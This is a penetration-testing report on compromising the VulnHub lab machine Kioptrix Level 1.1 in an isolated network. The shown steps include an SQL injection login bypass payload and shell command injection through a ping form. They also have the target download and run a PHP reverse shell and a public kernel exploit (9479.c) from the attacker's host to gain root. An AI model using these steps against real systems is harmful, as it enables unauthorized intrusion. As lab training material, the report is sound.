My IP: 192.168.96.3
Target IP: 192.168.96.16

---
Tools:

-  arp-scan
- nmap
- ffuf
- WhatWeb
- Burp Suite
- searchsploit

# 📝 Penetration Testing Report

# 🎯 VulnHub — Kioptrix Level 1.1

> **📌 Platform:** VulnHub  
> **🖥️ Lab Machine:** Kioptrix Level 1.1  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox (Host-Only Network)

---

# 📖 Overview

The objective of this assessment was to perform a full penetration test against the 
**Kioptrix Level 1.1** virtual machine in order to identify vulnerable services, obtain initial access, and subsequently escalate privileges to root.

During the assessment, an SQL injection vulnerability was identified in the web application. This vulnerability allowed authentication bypass and access to functionality that enabled network command execution.

Further analysis demonstrated that arbitrary operating system commands could be executed. This allowed a PHP reverse shell to be transferred to the target system and an interactive shell to be obtained.

After obtaining shell access, the Linux kernel version was identified. Public exploit research and Searchsploit revealed a suitable local privilege escalation exploit.

As a result of exploiting the vulnerable kernel, **root access** was successfully obtained.

---

# 💡 Skills Demonstrated

- 🌐 Network Reconnaissance
    
- 🔍 Service Enumeration
    
- 🌍 Web Enumeration
    
- 🧩 Technology Identification
    
- 💉 SQL Injection
    
- 🔐 Authentication Bypass
    
- 💻 OS Command Injection
    
- 🐚 Reverse Shell
    
- 📥 File Transfer
    
- 🐧 Linux Enumeration
    
- 🔎 Kernel Version Analysis
    
- 📚 Vulnerability Research
    
- 💣 Exploit Validation
    
- ⬆️ Privilege Escalation
    
- 👑 Root Access
    
- 📝 Security Reporting
    

---

# 🖥️ Lab Architecture

```text
Kali Linux
      │
      │ Host-Only Network
      │
Kioptrix Level 1.1
```

---

# 🛣️ Attack Chain

```text
🛰️ Host Discovery
        │
        ▼
🔍 Service Enumeration
        │
        ▼
🌐 HTTP Enumeration
        │
        ▼
🔎 Web Application Analysis
        │
        ▼
💉 SQL Injection
        │
        ▼
🔐 Authentication Bypass
        │
        ▼
💻 OS Command Injection
        │
        ▼
📥 PHP Reverse Shell
        │
        ▼
🐚 Initial Access
        │
        ▼
🐧 Local Enumeration
        │
        ▼
🔎 Kernel Version Identification
        │
        ▼
💣 Local Kernel Exploit
        │
        ▼
⬆️ Privilege Escalation
        │
        ▼
👑 Root Access
```

---

# 🛰️ 1. Network Reconnaissance

## 🎯 Objective

Identify the target system's IP address within the laboratory network.

## 🤔 Why this method?

Since the target machine was located within an isolated **VirtualBox Host-Only** network, ARP scanning was used to identify active hosts.

```bash
sudo arp-scan -I eth1 192.168.96.0/24
```

The target host was identified:

```text
192.168.96.16
```

### 🔎 Analysis

After identifying the target IP address, the next step was to enumerate the attack surface and determine which network services were exposed.

---

# 🔍 2. Service Enumeration

## 🎯 Objective

Identify open ports, running services, and their versions.

## 🤔 Why this method?

Service and version information can reveal potentially vulnerable components and help determine the most promising direction for further testing.

An aggressive Nmap scan was performed:

```bash
sudo nmap -sV -A -T5 192.168.96.16
```

The following services were identified:

|🔌 Port|🛠️ Service|📌 Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 3.9p1|
|80/tcp|HTTP|Apache 2.0.52|
|111/tcp|RPCBind|2|
|443/tcp|HTTPS|Apache 2.0.52|
|631/tcp|IPP|CUPS 1.1|

It was also discovered that the SSH service supported **SSHv1**:

```text
SSH-1.99-OpenSSH_3.9p1
Server supports SSHv1
```

The HTTPS service also supported the obsolete **SSLv2** protocol.



### 🔎 Analysis

Despite the presence of several outdated components, the web service on port **80** appeared to be the most promising attack surface.

Therefore, further investigation focused on HTTP.

---

# 🌐 3. HTTP Enumeration

## 🎯 Objective

Identify the functionality of the web application and locate potential attack points.

When accessing:

```text
http://192.168.96.16
```

a web page containing an administrator authentication form was discovered.

### 🔎 Analysis

The presence of an authentication form made the login mechanism a potential attack vector.

Before attempting exploitation, the web application and its structure were investigated further.

---

# 🔎 4. Directory Enumeration

## 🎯 Objective

Identify hidden directories and additional functionality within the web application.

**ffuf** was used for directory enumeration:

```bash
ffuf -u http://192.168.96.16/FUZZ \
-w /usr/share/wordlists/dirb/common.txt
```

The scan did not reveal any additional resources that were immediately useful for further exploitation.

### 🔎 Analysis

Since directory enumeration did not produce significant results, the next step was to identify the technologies used by the web application.

---

# 🧩 5. Web Technology Identification

## 🎯 Objective

Identify the application's technology stack.

**WhatWeb** was used for additional analysis.

The scan identified **PHP** as the technology used by the web application.

### 🔎 Analysis

The PHP identification did not directly reveal a specific vulnerability.

However, the presence of an authentication form and server-side application logic made input validation and authentication handling the next logical areas to investigate.

---

# 💉 6. SQL Injection

## 🎯 Objective

Test the authentication mechanism for an authentication bypass.

## 🤔 Why this method?

After analyzing the application, the login parameters were tested for SQL injection vulnerabilities.

Testing was performed using **Burp Suite**.

A series of SQL injection payloads was tested in the username field.

The payload:

```text
admin' #
```

successfully bypassed the authentication mechanism.

### 🔎 Analysis

The successful SQL injection provided access to functionality that was previously unavailable without authentication.

After logging in, a page was discovered that accepted an IP address and returned the result of a `ping` command.

This suggested that user input was being passed to a system command and warranted further investigation.

---

# 💻 7. OS Command Injection

## 🎯 Objective

Determine whether arbitrary operating system commands could be executed through the ping functionality.

## 🤔 Why this method?

The application accepted user-controlled input as an IP address and subsequently executed a network command.

This created a potential opportunity to inject additional commands using shell operators.

The following operator was tested:

```text
&&
```

The following command was then supplied:

```text
whoami
```

The application returned the result of the command execution.

### 🔎 Analysis

This confirmed the presence of an **OS Command Injection** vulnerability.

Therefore, after bypassing authentication through SQL Injection, it was possible to move from web application access to direct command execution on the underlying operating system.

The next objective was to obtain a fully interactive shell session.

---

# 🔄 8. Obtaining a Reverse Shell

## 🎯 Objective

Obtain a fully interactive shell session on the target system.

## 🤔 Why this method?

Executing individual commands through the web interface is inconvenient for further local enumeration.

Therefore, the next step was to transfer a PHP reverse shell to the target system.

First, the availability of `wget` was verified:

```bash
which wget
```

The command was available.

An HTTP server was started on the attacking machine:

```bash
python -m http.server
```

The vulnerable web application was then used to download the reverse shell:

```bash
wget http://192.168.96.3/php-reverse-shell.php \
-O /tmp/php-reverse-shell.php
```

The file was prepared for execution:

```bash
chmod +x /tmp/php-reverse-shell.php
```

The PHP reverse shell was then executed:

```bash
php /tmp/php-reverse-shell.php
```

A Netcat listener was configured on the attacking machine using the port specified in the reverse shell configuration.

An interactive shell session was successfully obtained.

### 🔎 Analysis

Obtaining an interactive shell made it possible to move from web exploitation to local operating system enumeration.

---

# 🐧 9. Local Enumeration

## 🎯 Objective

Identify the current user, available privileges, and potential privilege escalation paths.

After obtaining shell access, several basic commands were executed:

```bash
pwd
id
hostname
sudo -l
```

These commands were used to determine:

- the current user;
    
- the current working directory;
    
- the hostname;
    
- available `sudo` privileges.
    

However, these checks did not reveal an immediately useful privilege escalation path.

### 🔎 Analysis

The next step was to investigate the operating system and kernel version, as an outdated kernel may contain known local privilege escalation vulnerabilities.

---

# 🔎 10. Kernel Version Analysis

## 🎯 Objective

Identify the Linux kernel version and determine whether known local vulnerabilities could be applicable.

The kernel version was identified using:

```bash
uname -ar
```

The results confirmed that the target was running an outdated Linux kernel.

Based on the identified kernel version, public sources were searched for known local privilege escalation exploits.

---

# 📚 11. Local Exploit Research

## 🎯 Objective

Identify an exploit compatible with the discovered kernel version.

During the research, a public exploit related to the following Linux kernel vulnerability was identified:

```text
Linux Kernel 2.6 < 2.6.19
'ip_append_data()' Ring0 Privilege Escalation
```

Searchsploit was used to further validate the available exploits:

```bash
searchsploit linux kernel 2.6
```

A potentially suitable local privilege escalation exploit was identified:

```text
Linux Kernel 2.4/2.6
RedHat Linux 9 / Fedora Core 4 < 11 /
Whitebox 4 / CentOS 4
```

A local copy of the exploit was obtained using:

```bash
searchsploit -m linux/local/9479.c
```

### 🔎 Analysis

The exploit appeared compatible with the outdated kernel and target environment.

The next step was therefore to transfer the exploit to the target system and compile it locally.

---

# 📥 12. Exploit Transfer and Compilation

## 🎯 Objective

Prepare the local privilege escalation exploit on the target system.

The following source file was prepared on the attacking machine:

```text
9479.c
```

The previously configured HTTP server was used to transfer the file to the target.

On the target system:

```bash
wget http://192.168.96.3/9479.c \
-O /tmp/9479.c
```

After downloading the source code, it was compiled:

```bash
cd /tmp
gcc 9479.c -o 9479
```

---

# 👑 13. Privilege Escalation

## 🎯 Objective

Obtain superuser privileges.

After compilation, the exploit was executed:

```bash
./9479
```

The exploitation was successful.

Root privileges were obtained:

```text
root
```

### 🔎 Analysis

Privilege escalation was possible due to a vulnerability in the outdated Linux kernel.

The complete attack chain was therefore:

```text
SQL Injection
      ↓
Authentication Bypass
      ↓
OS Command Injection
      ↓
Reverse Shell
      ↓
Kernel Enumeration
      ↓
Public Kernel Exploit
      ↓
Root
```

---

# ⚠️ Findings

|Vulnerability|Risk|
|---|---|
|SQL Injection in the authentication mechanism|🔴 Critical|
|Authentication Bypass|🔴 Critical|
|OS Command Injection|🔴 Critical|
|Outdated Apache version|🟠 High|
|SSHv1 support|🟠 High|
|SSLv2 support|🔴 Critical|
|Outdated Linux Kernel|🔴 Critical|
|Local privilege escalation|🔴 Critical|
|Outdated PHP version|🟠 High|

---

# 🧠 Attack Chain Analysis

A key characteristic of this scenario is that obtaining root access required the sequential exploitation of multiple weaknesses.

### **1. SQL Injection**

Allowed the authentication mechanism to be bypassed.

### **2. OS Command Injection**

After authentication was bypassed, it allowed operating system commands to be executed.

### **3. Reverse Shell**

Converted limited command execution through the web interface into a fully interactive shell session.

### **4. Kernel Enumeration**

After obtaining shell access, the kernel version was identified.

### **5. Local Kernel Exploitation**

Public exploit research identified a suitable method for privilege escalation.

### **6. Root Access**

Exploitation of the kernel vulnerability resulted in full system compromise.

---

# ✅ Conclusion

**Kioptrix Level 1.1** demonstrates how dangerous the combination of multiple vulnerabilities can be.

The primary attack path was not based on a single critical vulnerability, but rather on the sequential analysis and exploitation of several weaknesses:

- 🔍 host discovery and service enumeration;
    
- 🌐 web application analysis;
    
- 💉 SQL Injection identification;
    
- 🔐 authentication bypass;
    
- 💻 OS Command Injection discovery;
    
- 🔄 reverse shell acquisition;
    
- 🐧 local system enumeration;
    
- 🔎 kernel version analysis;
    
- 📚 public exploit research;
    
- ⬆️ privilege escalation;
    
- 👑 root access.
    

The main takeaway from this assessment is that **each stage of the attack was based on information obtained during the previous stage**.

This demonstrates that penetration testing should not be treated as a sequence of random exploitation attempts, but rather as a structured decision-making process based on reconnaissance, enumeration, analysis, and validation.